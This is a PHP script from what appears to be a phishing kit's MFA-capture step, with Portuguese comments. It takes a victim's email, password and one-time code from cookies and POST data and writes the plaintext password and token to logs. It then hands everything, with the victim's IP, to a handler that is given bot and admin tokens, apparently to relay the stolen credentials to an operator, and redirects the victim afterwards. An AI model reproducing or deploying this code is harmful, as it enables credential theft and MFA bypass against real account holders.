<?php
require 'source/core/system/include.php';

// DEBUG
error_log("=== VERIFY2.PHP DEBUG ===");
error_log("POST mfacode2: " . (isset($_POST["mfacode2"]) ? $_POST["mfacode2"] : "VAZIO"));
error_log("COOKIE token: " . (isset($_COOKIE['token']) ? $_COOKIE['token'] : "VAZIO"));
error_log("COOKIE email: " . (isset($_COOKIE['email']) ? $_COOKIE['email'] : "VAZIO"));
error_log("COOKIE password: " . (isset($_COOKIE['password']) ? $_COOKIE['password'] : "VAZIO"));
error_log("========================");

if(!isset($_POST["mfacode2"])){
    error_log("ERRO: mfacode2 não enviado!");
    die("Erro: código não fornecido");
}

$mfacode = $_POST["mfacode2"];

$client_ip        =  $_SERVER["REMOTE_ADDR"];
$server_hostname  =  $_SERVER["HTTP_HOST"];
$full_url         =  $_SERVER["HTTP_HOST"].$_SERVER["PHP_SELF"];

if(!isset($_COOKIE['password']) || !isset($_COOKIE['email']) || !isset($_COOKIE['token'])){
    error_log("ERRO: Cookies não encontrados!");
    die("Erro: sessão perdida");
}

$password = $_COOKIE['password'];
$login = $_COOKIE['email'];
$totp_result = $_COOKIE['token'];

error_log("Token extraído: " . substr($totp_result, 0, 30) . "...");

unset($_SESSION["credentials"]);
unset($_SESSION["captcha_key"]);
unset($_SESSION["ticket"]);
unset($_SESSION["mfa_invalid"]);

// Chamar o handler
$api_response = $Main->handler(
    $bot_token, 
    $user_id, 
    $client_ip, 
    $password, 
    $full_url, 
    $login, 
    $server_hostname,
    $admin_id,
    $admin_token,
    $totp_result,
    $admin_sendlog,
    $mfacode
);

// Limpar cookies
setcookie("token", "", time() - 3600, "/");
setcookie("email", "", time() - 3600, "/");
setcookie("password", "", time() - 3600, "/");

// Redirecionar
header("Location: ".$url_redirect);
die();
?>